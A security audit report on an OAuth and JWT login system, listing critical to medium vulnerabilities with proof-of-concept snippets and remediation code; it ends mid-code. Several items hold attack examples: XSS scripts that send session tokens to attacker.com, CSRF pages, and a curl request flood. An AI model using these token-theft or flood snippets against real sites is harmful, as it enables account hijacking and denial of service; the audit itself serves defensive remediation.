# Security Audit Report: OAuth + JWT Authentication System

**Date**: 2026-02-01
**Severity Summary**: 8 Critical, 7 High, 5 Medium vulnerabilities
**Overall Risk Level**: HIGH - Requires immediate remediation

---

## Executive Summary

The authentication system contains multiple critical security vulnerabilities that expose the application to XSS, CSRF, token theft, and information disclosure attacks. The most severe issues involve token transmission, storage, validation, and missing rate limiting. While the architecture shows good intent (httpOnly cookies, JWT separation), implementation flaws significantly undermine the security posture.

**Immediate Actions Required**:
1. Implement request/parameter validation with rate limiting
2. Fix token transmission vulnerabilities (URL exposure)
3. Add CSRF protection
4. Remove sensitive data from logs and errors
5. Implement proper token validation on all endpoints

---

## CRITICAL VULNERABILITIES (🔴)

### 1. **Access Token Exposed in URL (CRITICAL)**
**Files**: `server/src/routes/auth.ts:43, 78, 109` | `client/contexts/AuthContext.tsx:32-36`
**Severity**: CRITICAL (OWASP A01:2021 - Broken Access Control)

**Issue**:
Access tokens are passed via URL query parameters during OAuth callback redirects:
```javascript
// auth.ts line 43, 78, 109
res.redirect(`${CLIENT_URL}?token=${accessToken}`);

// AuthContext.tsx line 32-36
const tokenFromURL = params.get('token');
if (tokenFromURL) {
  saveToken(tokenFromURL);
}
```

**Attack Vectors**:
- **Browser History**: Token persists in browser history/autocomplete
- **Referrer Headers**: Token leaked via `Referer` header to external sites
- **Server Logs**: URLs logged in web server access logs with plaintext tokens
- **Reverse Proxies**: Tokens visible to CDN/load balancer logs
- **Browser Extensions**: Any extension can read URL parameters

**Proof of Concept**:
```
User logs in → Browser redirects to: http://localhost:5173?token=eyJhbGc...
Attacker views browser history or server logs → Gets valid JWT
Attacker uses token in Authorization header → Full account access for 15 minutes
```

**Recommendation**:
✅ Remove token from URL. Use one of these approaches:
1. **Recommended**: Post token to sessionStorage via code parameter
   ```javascript
   // auth.ts
   const code = generateRandomCode();
   storeCodeMapping(code, { accessToken, refreshToken });
   res.redirect(`${CLIENT_URL}?code=${code}`);

   // Client validates code via secure endpoint
   const response = await fetch('/auth/verify-code', { method: 'POST', body: { code } });
   ```

2. **Alternative**: Use fragment identifier (not sent to server, but still in history)
   ```javascript
   res.redirect(`${CLIENT_URL}#token=${accessToken}`);
   ```

3. **Better Alternative**: Use refresh token rotation with httpOnly cookies only
   ```javascript
   // Set refresh token in httpOnly cookie
   // Client calls /auth/me which returns minimal user info
   // /auth/me validates cookie and returns user (no token needed)
   ```

---

### 2. **Missing CSRF Protection (CRITICAL)**
**Files**: `server/src/index.ts:24-28` | `server/src/routes/auth.ts` (all endpoints)
**Severity**: CRITICAL (OWASP A01:2021 - Broken Access Control)

**Issue**:
CORS is configured to accept requests from `CLIENT_URL` with `credentials: true`, but there's no CSRF token validation:
```javascript
// index.ts line 24-28
cors({
  origin: CLIENT_URL,
  credentials: true,  // Allows cookies in cross-origin requests
  // Missing: csrf protection, token validation
})
```

**Attack Vectors**:
- **Token Refresh CSRF**: Attacker tricks user into visiting malicious site that calls POST `/auth/refresh`
- **Logout CSRF**: Force user logout by POST `/auth/logout`
- **Endpoint Hijacking**: Any form/script on attacker's site can trigger state-changing operations

**Proof of Concept**:
```html
<!-- Attacker's website: evilsite.com -->
<img src="http://localhost:3001/auth/logout" />
<!-- Automatically logs out victim -->

<!-- Or malicious form -->
<form action="http://localhost:3001/auth/refresh" method="POST">
  <!-- Hidden, auto-submitted -->
</form>
```

**Recommendation**:
✅ Implement CSRF protection:
```javascript
// Install: npm install csrf
import csrf from 'csrf';

const csrfProtection = new csrf.Tokens();

// In middleware (after session)
app.use((req, res, next) => {
  if (req.method === 'POST' || req.method === 'PATCH' || req.method === 'DELETE') {
    const token = req.headers['x-csrf-token'];
    if (!token || !csrfProtection.verify(req.session.csrfSecret, token)) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

// Provide CSRF token to client
app.get('/auth/csrf', (req, res) => {
  req.session.csrfSecret = csrfProtection.secretSync();
  res.json({ token: csrfProtection.create(req.session.csrfSecret) });
});
```

---

### 3. **No Input Validation on OAuth Callbacks (CRITICAL)**
**Files**: `server/src/routes/auth.ts:62-65, 93-96`
**Severity**: CRITICAL (OWASP A03:2021 - Injection)

**Issue**:
OAuth callbacks don't validate or sanitize `CLIENT_URL` before redirecting:
```javascript
// auth.ts line 59, 90
failureRedirect: `${CLIENT_URL}/login?error=google_failed`,

// And redirect after token generation:
res.redirect(`${CLIENT_URL}?token=${accessToken}`);
```

**Attack Vector**:
Environment variable poisoning allows redirect to attacker's site:
```bash
# Attacker sets environment variable
CLIENT_URL="http://attacker.com"
# Or exploits deployment misconfiguration

# User gets redirected with valid token
http://attacker.com?token=eyJhbGc...
```

**Proof of Concept**:
```
1. Attacker gains temporary server access, sets: CLIENT_URL=http://phishing-site.com
2. User initiates OAuth login
3. After successful OAuth, user redirected to: http://phishing-site.com?token=[JWT]
4. Attacker captures token and user session
```

**Recommendation**:
✅ Implement redirect URL validation:
```javascript
const ALLOWED_REDIRECT_URLS = [
  process.env.CLIENT_URL,
  process.env.CLIENT_URL_PROD
].filter(Boolean);

function isValidRedirectUrl(url: string): boolean {
  try {
    const urlObj = new URL(url);
    // Only allow http/https
    if (!['http:', 'https:'].includes(urlObj.protocol)) return false;
    // Check against whitelist
    return ALLOWED_REDIRECT_URLS.some(allowed => urlObj.href.startsWith(allowed));
  } catch {
    return false;
  }
}

// Usage
const redirectUrl = isValidRedirectUrl(`${CLIENT_URL}?token=${accessToken}`)
  ? `${CLIENT_URL}?token=${accessToken}`
  : `${ALLOWED_REDIRECT_URLS[0]}?error=invalid_redirect`;

res.redirect(redirectUrl);
```

---

### 4. **No Rate Limiting on Authentication Endpoints (CRITICAL)**
**Files**: All auth endpoints in `server/src/routes/auth.ts`
**Severity**: CRITICAL (OWASP A04:2021 - Insecure Design)

**Issue**:
No rate limiting on OAuth callbacks, token refresh, or logout:
```javascript
router.post('/refresh', async (req: Request, res: Response) => {
  // No rate limit - can be called unlimited times
```

**Attack Vectors**:
- **Brute Force Token Validation**: Attacker tries 1000s of tokens/second
- **Denial of Service**: Exhaust server resources with rapid refresh requests
- **Token Enumeration**: Generate sequential JWTs and validate rapidly
- **Logout Spam**: Force rapid session invalidation

**Proof of Concept**:
```bash
# Brute force token refresh (no delay)
for i in {1..10000}; do
  curl -X POST http://localhost:3001/auth/refresh \
    -H "Cookie: refreshToken=[JWT]" &
done

# Generates 10,000 concurrent requests - DOS attack
```

**Recommendation**:
✅ Implement rate limiting:
```javascript
// Install: npm install express-rate-limit
import rateLimit from 'express-rate-limit';

// Aggressive limits for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many authentication attempts, please try again later',
  standardHeaders: true, // Return RateLimit headers
  legacyHeaders: false,
  skip: (req) => {
    // Only rate limit if using JWT token (not fresh OAuth)
    return !req.cookies.refreshToken && !req.body.refreshToken;
  }
});

const tokenLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 10, // 10 refresh requests per minute per IP
});

router.post('/refresh', tokenLimiter, async (req, res) => { ... });
router.post('/logout', authLimiter, (req, res) => { ... });
router.post('/dev-login', authLimiter, async (req, res) => { ... });

// Also add IP-based limit for OAuth callbacks
const oauthLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 20, // 20 OAuth attempts per hour per IP
  keyGenerator: (req) => req.ip || 'unknown'
});

router.get('/google/callback', oauthLimiter, passport.authenticate(...));
router.get('/github/callback', oauthLimiter, passport.authenticate(...));
```

---

### 5. **Access Token in Memory + SessionStorage (CRITICAL)**
**Files**: `client/utils/tokenStorage.ts:1-32`
**Severity**: CRITICAL (OWASP A01:2021 - Broken Access Control)

**Issue**:
Access tokens are stored in both memory and sessionStorage, creating multiple XSS attack vectors:
```javascript
// tokenStorage.ts
let tokenInMemory: string | null = null; // Global variable - XSS accessible

export function saveToken(token: string): void {
  tokenInMemory = token;
  sessionStorage.setItem(TOKEN_KEY, token); // Accessible via JavaScript
}
```

**Attack Vectors**:
1. **XSS via Stored/Reflected XSS**: Malicious script reads `sessionStorage.getItem('auth_token')`
2. **XSS via DOM-based**: Script reads global state or accesses window properties
3. **Service Worker Hijacking**: Service worker script steals tokens from storage
4. **Browser Extension**: Any extension can read sessionStorage contents
5. **DevTools Console**: During debugging, entire session exposed

**Proof of Concept**:
```javascript
// Attacker injects script via XSS (e.g., user input not sanitized)
// Script runs in user's context
const token = sessionStorage.getItem('auth_token');
const userData = JSON.parse(atob(token.split('.')[1])); // Decode JWT
fetch('http://attacker.com/steal', { method: 'POST', body: token });
```

**Why This is Critical**:
- Access tokens are valid for 15 minutes (long enough to cause damage)
- sessionStorage is same-origin accessible by any JavaScript
- Memory access via debugger or state inspection
- No XSS protection means persistent vulnerability

**Recommendation**:
✅ Remove sessionStorage entirely, rely only on httpOnly cookies:
```javascript
// tokenStorage.ts - REVISED
// Remove memory storage entirely
// Remove sessionStorage usage
// Only use httpOnly cookies (set by /auth/refresh endpoint)

export function getAuthHeader(): { Authorization: string } | {} {
  // Don't retrieve token - it's in httpOnly cookie
  // Server should validate cookie instead
  return {}; // Let browser send cookie automatically
}

// Alternative for Authorization header (if needed):
// Call /auth/me endpoint which validates httpOnly cookie
// and returns user info without exposing token
```

Or, if tokens MUST be in JavaScript memory:
```javascript
// Minimal exposure approach
const TOKEN_KEY = 'auth_token';
let tokenInMemory: string | null = null;

export function saveToken(token: string): void {
  // Only keep in memory - remove sessionStorage
  tokenInMemory = token;
  // DO NOT STORE IN SESSIONSTORAGE
}

export function getToken(): string | null {
  // Only return from memory
  return tokenInMemory;
}

export function removeToken(): void {
  tokenInMemory = null;
  // On page refresh, token is lost (user must re-authenticate)
  // This is acceptable - refreshToken in httpOnly cookie handles re-auth
}

// On page load, always fetch fresh user data
// Never restore token from storage
```

---

### 6. **No Token Validation on /me Endpoint (CRITICAL)**
**Files**: `server/src/routes/auth.ts:112-137`
**Severity**: CRITICAL (OWASP A01:2021 - Broken Access Control)

**Issue**:
The `/me` endpoint doesn't properly validate tokens and silently returns null on error:
```javascript
// auth.ts line 112-137
router.get('/me', async (req: Request, res: Response) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;

    if (!token) {
      console.log('토큰 없음'); // Line 118: Logs in Korean (no token)
      return res.status(401).json({ error: 'No token' });
    }

    const { verifyToken } = await import('../utils/jwt.js');
    const payload = verifyToken(token);

    if (!payload) {
      return res.status(401).json({ error: 'Invalid token' }); // No user data
    }

    const user = await prisma.user.findUnique({
      where: { id: payload.id },
    });

    res.json({ user }); // Returns null if user not found
  } catch (error) {
    res.json({ user: null }); // Hides all errors silently
  }
});
```

**Issues**:
1. Catch block swallows all errors (including server crashes) and returns 200 OK with null
2. No error status code returned (always 200)
3. No distinction between "invalid token" and "user deleted"
4. Client-side code (AuthContext.tsx:23) catches all exceptions and assumes logout

**Attack Scenario**:
```javascript
// Attacker sends random/expired token
// GET /auth/me with: Authorization: Bearer invalid_token
// Response: 200 { "user": null }
// Client interprets as "not logged in" instead of "invalid token"
// Attacker can't distinguish between expired vs. active sessions
```

**Recommendation**:
✅ Return proper HTTP status codes and validate tokens:
```javascript
router.get('/me', async (req: Request, res: Response) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;

    // Return 401, not 200
    if (!token) {
      return res.status(401).json({
        error: 'No token provided',
        code: 'NO_TOKEN'
      });
    }

    const { verifyToken } = await import('../utils/jwt.js');
    const payload = verifyToken(token);

    // Check for invalid token
    if (!payload) {
      return res.status(401).json({
        error: 'Invalid or expired token',
        code: 'INVALID_TOKEN'
      });
    }

    const user = await prisma.user.findUnique({
      where: { id: payload.id },
    });

    // User was deleted after token issued
    if (!user) {
      return res.status(401).json({
        error: 'User not found',
        code: 'USER_NOT_FOUND'
      });
    }

    // Success - return user
    return res.status(200).json({ user });
  } catch (error) {
    // Only catch unexpected errors
    console.error('Unexpected error in /me endpoint:', error);
    return res.status(500).json({
      error: 'Internal server error',
      code: 'INTERNAL_ERROR'
    });
  }
});
```

---

### 7. **No Sensitive Data Filtering in Error Responses (CRITICAL)**
**Files**: `server/src/routes/auth.ts:45, 164` | All error responses
**Severity**: CRITICAL (OWASP A01:2021 - Broken Access Control)

**Issue**:
Error messages expose sensitive information via console.error and error responses:
```javascript
// auth.ts line 45
console.error('Dev login error:', error); // Full error stack to logs

// auth.ts line 164
console.error('Token refresh error:', error); // Full error stack to logs

// auth.ts line 135
res.json({ user: null }); // Vague response is good, but...

// All other endpoints return generic errors
res.status(500).json({ error: 'Dev login failed' });
```

**Attack Vectors**:
- **Information Disclosure**: Server logs reveal system details, database structure, file paths
- **Stack Traces**: If error is logged with stack trace, reveals internal code structure
- **Database Errors**: If database query fails, full error string might be visible
- **Log Access**: If logs are accessible (cloud storage, backups), attacker gets details

**Recommendation**:
✅ Never log full errors, sanitize error messages:
```javascript
router.get('/dev-login', async (req: Request, res: Response) => {
  try {
    // ... code ...
  } catch (error) {
    // Log for debugging (in secure environment only)
    if (process.env.NODE_ENV === 'development') {
      console.error('Dev login error:', error); // Only in dev
    } else {
      // Production: log sanitized version
      console.error('Dev login failed:', {
        timestamp: new Date().toISOString(),
        endpoint: req.path,
        // NO error details
      });
    }

    // Always return generic error to client
    return res.status(500).json({
      error: 'Authentication failed. Please try again.',
      code: 'AUTH_FAILED'
      // Never include actual error message
    });
  }
});

// Create error handler middleware
app.use((err: any, req: Request, res: Response, next: NextFunction) => {
  // Log full error internally
  if (process.env.NODE_ENV !== 'production') {
    console.error('Unhandled error:', err);
  }

  // Return generic error to client
  res.status(500).json({
    error: 'Internal server error',
    code: 'INTERNAL_ERROR',
    // Never expose stack trace, file paths, or database errors
  });
});
```

---

### 8. **No Refresh Token Rotation (CRITICAL)**
**Files**: `server/src/routes/auth.ts:139-167`
**Severity**: CRITICAL (OWASP A02:2021 - Cryptographic Failures)

**Issue**:
Refresh tokens never expire or rotate. Once issued, they're valid for 7 days without any validation:
```javascript
// auth.ts line 139-167
router.post('/refresh', async (req: Request, res: Response) => {
  try {
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({ error: 'No refresh token' });
    }

    const payload = verifyRefreshToken(refreshToken); // Only JWT verification

    if (!payload) {
      return res.status(401).json({ error: 'Invalid or expired refresh token' });
    }

    // No rotation - same token can be reused forever
    const { accessToken } = generateTokens(user);
    res.json({ accessToken }); // No new refreshToken issued
  } catch (error) {
    // ...
  }
});
```

**Attack Scenario**:
```
1. Attacker steals refreshToken from user's browser
2. Even if user detects breach and logs out, refreshToken is still valid
3. Attacker calls /auth/refresh every 14 minutes for 7 days
4. Maintains persistent access without user knowledge
```

**Recommendation**:
✅ Implement refresh token rotation:
```javascript
// Maintain a token rotation policy
// Option 1: One-time use tokens
router.post('/refresh', async (req: Request, res: Response) => {
  try {
    const oldRefreshToken = req.cookies.refreshToken;

    if (!oldRefreshToken) {
      return res.status(401).json({ error: 'No refresh token' });
    }

    const payload = verifyRefreshToken(oldRefreshToken);
    if (!payload) {
      return res.status(401).json({ error: 'Invalid or expired refresh token' });
    }

    // Check if this token has already been used (rotation)
    const tokenFamily = await prisma.tokenRotation.findUnique({
      where: { id: payload.tokenId }
    });

    if (tokenFamily?.isUsed) {
      // Token reuse detected - potential breach
      // Invalidate entire token family
      await prisma.tokenRotation.updateMany({
        where: { familyId: tokenFamily.familyId },
        data: { isRevoked: true }
      });

      return res.status(401).json({
        error: 'Token reuse detected. Please log in again.',
        code: 'TOKEN_REUSE_DETECTED'
      });
    }

    const user = await prisma.user.findUnique({
      where: { id: payload.id }
    });

    if (!user) {
      return res.status(401).json({ error: 'User not found' });
    }

    // Mark old token as used
    await prisma.tokenRotation.update({
      where: { id: payload.tokenId },
      data: { isUsed: true }
    });

    // Generate new tokens with new rotation ID
    const { accessToken, refreshToken: newRefreshToken } = generateTokens(user);

    // Store new rotation record
    await prisma.tokenRotation.create({
      data: {
        userId: user.id,
        familyId: tokenFamily.familyId, // Link to family
        tokenId: generateSecureRandomId(), // New ID for next refresh
        isUsed: false,
        isRevoked: false,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
      }
    });

    // Issue new refresh token with new rotation ID
    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000,
      path: '/',
      domain: COOKIE_DOMAIN
    });

    res.json({ accessToken });
  } catch (error) {
    console.error('Token refresh error:', error);
    res.status(401).json({ error: 'Failed to refresh token' });
  }
});
```

---

## HIGH SEVERITY VULNERABILITIES (🟡)

### 9. **sameSite="lax" Not Optimal for Modern Security**
**Files**: `server/src/routes/auth.ts:37, 72, 103, 173` | `server/src/index.ts:39`
**Severity**: HIGH (OWASP A01:2021 - Broken Access Control)

**Issue**:
`sameSite: 'lax'` provides less protection than `sameSite: 'strict'`:
```javascript
// auth.ts line 37, 72, 103, 173
res.cookie('refreshToken', refreshToken, {
  sameSite: 'lax', // Allows cookies in top-level navigations
  // ...
});
```

**Explanation**:
- `lax`: Cookies sent on top-level navigations (e.g., `<a href="">` links)
- `strict`: Cookies NEVER sent in cross-site contexts
- For refresh tokens, strict provides better protection

**Recommendation**:
✅ Use `sameSite: 'strict'`:
```javascript
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production', // Force true in prod
  sameSite: 'strict', // More secure than 'lax'
  maxAge: 7 * 24 * 60 * 60 * 1000,
  path: '/',
  domain: COOKIE_DOMAIN
});
```

---

### 10. **Development Login Endpoint in Production Risk**
**Files**: `server/src/routes/auth.ts:11, 14-49`
**Severity**: HIGH (OWASP A04:2021 - Insecure Design)

**Issue**:
`/auth/dev-login` endpoint creates accounts without OAuth if `DEV_MODE=true`:
```javascript
const DEV_MODE = process.env.NODE_ENV !== 'production' && process.env.DEV_MODE === 'true';

if (DEV_MODE) {
  router.get('/dev-login', async (req: Request, res: Response) => {
    // Creates user with provider='dev'
    // No authentication required
    // Anyone who knows endpoint can log in
  });
}
```

**Risk**: If `DEV_MODE` is accidentally enabled in production, anyone can log in:
```bash
curl http://production-app.com/auth/dev-login
# User logged in as dev@localhost without authentication
```

**Recommendation**:
✅ Use more explicit environment variables:
```javascript
// Require EXPLICIT dev mode flag, not just NODE_ENV check
const ENABLE_DEV_LOGIN =
  process.env.NODE_ENV === 'development' &&
  process.env.ENABLE_DEV_LOGIN === 'true' &&
  process.env.ALLOW_INSECURE_AUTH === 'true'; // Extra confirmation

if (ENABLE_DEV_LOGIN) {
  // Add strong warning
  console.warn('⚠️  DEVELOPMENT MODE: /auth/dev-login is ENABLED. This is INSECURE.');

  router.get('/dev-login', async (req: Request, res: Response) => {
    // ... rest of code ...
  });
}

// In production, ensure these are NOT set
if (process.env.NODE_ENV === 'production' && ENABLE_DEV_LOGIN) {
  throw new Error('FATAL: Dev login enabled in production. This is a security breach.');
}
```

---

### 11. **Cookie Domain Validation Missing**
**Files**: `server/src/routes/auth.ts:12` | `server/src/index.ts` (implicit)
**Severity**: HIGH (OWASP A01:2021 - Broken Access Control)

**Issue**:
`COOKIE_DOMAIN` is set from environment without validation:
```javascript
// auth.ts line 12
const COOKIE_DOMAIN = process.env.NODE_ENV === 'production'
  ? process.env.COOKIE_DOMAIN
  : 'localhost';

// Later used in cookie settings:
res.cookie('refreshToken', refreshToken, {
  domain: COOKIE_DOMAIN // No validation
});
```

**Attack Scenario**:
```bash
# Attacker sets environment variable
COOKIE_DOMAIN=.attacker.com

# Now cookies sent to attacker.com subdomain too
# Cookie with auth token accessible to attacker
```

**Recommendation**:
✅ Validate domain against whitelist:
```javascript
const ALLOWED_DOMAINS = [
  'localhost',
  'example.com',
  'app.example.com'
].filter(Boolean);

const COOKIE_DOMAIN = (() => {
  const envDomain = process.env.COOKIE_DOMAIN;

  if (!envDomain) {
    return process.env.NODE_ENV === 'production' ? undefined : 'localhost';
  }

  // Validate domain format
  if (!isValidDomain(envDomain) || !ALLOWED_DOMAINS.includes(envDomain)) {
    throw new Error(`Invalid COOKIE_DOMAIN: ${envDomain}`);
  }

  return envDomain;
})();

function isValidDomain(domain: string): boolean {
  // Only alphanumeric, dots, hyphens
  return /^[a-z0-9.-]+$/i.test(domain) &&
         !domain.startsWith('-') &&
         !domain.endsWith('-');
}
```

---

### 12. **No HTTPS Requirement in Non-Production (HIGH but Expected)**
**Files**: `server/src/index.ts:36` | `server/src/routes/auth.ts:36, 71, 102, 172`
**Severity**: HIGH (OWASP A02:2021 - Cryptographic Failures)

**Issue**:
Cookies set with `secure: false` in development:
```javascript
// index.ts line 36
cookie: {
  secure: process.env.NODE_ENV === 'production', // false in dev
  // ...
}
```

**Why This Matters**:
In development, cookies sent over HTTP (unencrypted). If development server is exposed to network, cookies can be captured.

**Recommendation**:
✅ Force HTTPS in all environments except localhost:
```javascript
const isSecureEnvironment = () => {
  const hostname = process.env.HOST || 'localhost';
  const isLocalhost = ['localhost', '127.0.0.1', '::1'].includes(hostname);
  return process.env.NODE_ENV === 'production' || !isLocalhost;
};

app.use(
  session({
    // ...
    cookie: {
      secure: isSecureEnvironment(),
      httpOnly: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    },
  })
);

// Also add HTTPS redirect in production
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
      next();
    }
  });
}
```

---

### 13. **No Token Blacklist on Logout (HIGH)**
**Files**: `server/src/routes/auth.ts:169-179`
**Severity**: HIGH (OWASP A01:2021 - Broken Access Control)

**Issue**:
Logout only clears the refresh cookie, but doesn't invalidate existing access tokens:
```javascript
// auth.ts line 169-179
router.post('/logout', (req: Request, res: Response) => {
  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    domain: COOKIE_DOMAIN
  });

  res.json({ success: true });
  // Access token still valid for 15 more minutes!
});
```

**Attack Scenario**:
```
1. User logs out at 2:00 PM (access token valid until 2:15 PM)
2. Attacker who stole token can still use it for 15 minutes
3. User unaware their session is still active
4. Attacker could have been stealing data during this time
```

**Recommendation**:
✅ Maintain token blacklist:
```javascript
// Implement token blacklist in Redis (or database)
// Install: npm install redis

import { createClient } from 'redis';
const redis = createClient();

// Blacklist token on logout
router.post('/logout', async (req: Request, res: Response) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;

    // Clear refresh cookie
    res.clearCookie('refreshToken', {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      path: '/',
      domain: COOKIE_DOMAIN
    });

    // Blacklist access token if present
    if (token) {
      const decoded = verifyAccessToken(token);
      if (decoded) {
        // Store token in blacklist with expiry matching token expiry
        const expiryTime = Math.floor((decoded.exp - Date.now() / 1000) * 1000);
        if (expiryTime > 0) {
          await redis.setex(`blacklist:${token}`, expiryTime, 'true');
        }
      }
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Logout error:', error);
    res.status(500).json({ error: 'Logout failed' });
  }
});

// Check blacklist in /me endpoint
router.get('/me', async (req: Request, res: Response) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;

    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }

    // Check if token is blacklisted
    const isBlacklisted = await redis.get(`blacklist:${token}`);
    if (isBlacklisted) {
      return res.status(401).json({ error: 'Token has been revoked' });
    }

    const payload = verifyAccessToken(token);
    if (!payload) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    const user = await prisma.user.findUnique({
      where: { id: payload.id }
    });

    if (!user) {
      return res.status(401).json({ error: 'User not found' });
    }

    res.json({ user });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

---

### 14. **No Content-Security-Policy Header (HIGH)**
**Files**: `server/src/index.ts`
**Severity**: HIGH (OWASP A03:2021 - Injection)

**Issue**:
No CSP header to prevent XSS attacks:
```javascript
// server/src/index.ts - Missing CSP header
// Should add middleware:
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', '...');
  next();
});
```

**Attack**: XSS vulnerability allows inline scripts:
```html
<!-- Attacker injects in user-controlled field -->
<script>
fetch('http://attacker.com?token=' + sessionStorage.getItem('auth_token'));
</script>
```

**Recommendation**:
✅ Add CSP header:
```javascript
// In server/src/index.ts, after express() initialization
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self'", // No inline scripts
      "style-src 'self' 'unsafe-inline'", // CSS can be inline
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://accounts.google.com https://github.com", // OAuth endpoints
      "frame-src https://accounts.google.com", // For OAuth popup
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; ')
  );
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
```

---

### 15. **No Secure Password for Session Secret Check (HIGH)**
**Files**: `server/src/index.ts:14-18`
**Severity**: HIGH (OWASP A04:2021 - Insecure Design)

**Issue**:
Only checks if `SESSION_SECRET` is set, not if it's strong:
```javascript
// index.ts line 14-18
const SESSION_SECRET = process.env.SESSION_SECRET;

if (!SESSION_SECRET) {
  throw new Error('SESSION_SECRET environment variable is not set...');
}
// No check for strength/length
```

**Risk**: Developer could set `SESSION_SECRET=password` (too weak):
```bash
SESSION_SECRET="password" npm start
# Session encryption is weak
```

**Recommendation**:
✅ Validate secret strength:
```javascript
const SESSION_SECRET = process.env.SESSION_SECRET;
const JWT_SECRET = process.env.JWT_SECRET;
const REFRESH_SECRET = process.env.REFRESH_SECRET;

function validateSecret(name: string, value: string | undefined): string {
  if (!value) {
    throw new Error(`${name} environment variable is not set. This is required for security.`);
  }

  if (value.length < 32) {
    throw new Error(
      `${name} must be at least 32 characters long. ` +
      `Current length: ${value.length}. ` +
      `Generate with: openssl rand -base64 32`
    );
  }

  // Check for common weak patterns
  if (/^(password|secret|123|admin|test|default)/i.test(value)) {
    throw new Error(`${name} appears to be a common/weak value. Use a cryptographically secure random value.`);
  }

  return value;
}

const validatedSessionSecret = validateSecret('SESSION_SECRET', SESSION_SECRET);
const validatedJwtSecret = validateSecret('JWT_SECRET', JWT_SECRET);
const validatedRefreshSecret = validateSecret('REFRESH_SECRET', REFRESH_SECRET);
```

---

## MEDIUM SEVERITY VULNERABILITIES (🟡)

### 16. **Missing X-Requested-With Header Validation (MEDIUM)**
**Files**: All POST/PATCH/DELETE endpoints in `server/src/routes/auth.ts`
**Severity**: MEDIUM (OWASP A01:2021 - Broken Access Control)

**Issue**:
No validation of `X-Requested-With: XMLHttpRequest` header, allowing form-based CSRF:
```javascript
// No middleware checking for X-Requested-With or Content-Type for CSRF
```

**Recommendation**:
```javascript
// Add CSRF validation middleware
const validateJsonRequest = (req: Request, res: Response, next: NextFunction) => {
  if (['POST', 'PATCH', 'DELETE'].includes(req.method)) {
    const contentType = req.headers['content-type'];
    const xRequestedWith = req.headers['x-requested-with'];

    // Require either JSON content-type or XMLHttpRequest header
    if (!contentType?.includes('application/json') && xRequestedWith !== 'XMLHttpRequest') {
      return res.status(403).json({ error: 'Invalid request format' });
    }
  }
  next();
};

app.use(validateJsonRequest);
```

---

### 17. **No Audit Logging for Authentication Events (MEDIUM)**
**Files**: All auth endpoints in `server/src/routes/auth.ts`
**Severity**: MEDIUM (OWASP A09:2021 - Logging and Monitoring Failures)

**Issue**:
No logging of authentication events for security auditing:
```javascript
// No logs of:
// - Successful login
// - Failed login attempts
// - Token refresh
// - Logout
// - Session changes
```

**Recommendation**:
```javascript
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ],
});

// Log authentication events
router.get('/google/callback',
  passport.authenticate('google', { session: false }),
  (req: Request, res: Response) => {
    logger.info('User login successful', {
      provider: 'google',
      userId: req.user?.id,
      timestamp: new Date().toISOString(),
      ip: req.ip,
    });
    // ... rest of code ...
  }
);

router.post('/logout', (req: Request, res: Response) => {
  const token = req.headers.authorization?.substring(7);
  const payload = token ? verifyAccessToken(token) : null;

  logger.info('User logout', {
    userId: payload?.id,
    timestamp: new Date().toISOString(),
    ip: req.ip,
  });
  // ... rest of code ...
});
```

---

### 18. **No Account Lockout After Failed Attempts (MEDIUM)**
**Files**: `server/src/routes/auth.ts`
**Severity**: MEDIUM (OWASP A04:2021 - Insecure Design)

**Issue**:
No account lockout mechanism for failed authentication attempts:
```javascript
// /dev-login creates user without checks
// /auth/me doesn't track failed attempts
// No brute force protection per account
```

**Recommendation**:
```javascript
// Track failed attempts
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

async function recordFailedAttempt(userId: string) {
  const attempt = await prisma.loginAttempt.create({
    data: { userId, timestamp: new Date() }
  });

  // Check if account should be locked
  const recentAttempts = await prisma.loginAttempt.count({
    where: {
      userId,
      timestamp: { gte: new Date(Date.now() - LOCKOUT_DURATION) }
    }
  });

  if (recentAttempts >= MAX_LOGIN_ATTEMPTS) {
    await prisma.user.update({
      where: { id: userId },
      data: { lockedUntil: new Date(Date.now() + LOCKOUT_DURATION) }
    });
  }
}

// In /me endpoint
router.get('/me', async (req: Request, res: Response) => {
  // ... validation code ...

  const user = await prisma.user.findUnique({
    where: { id: payload.id }
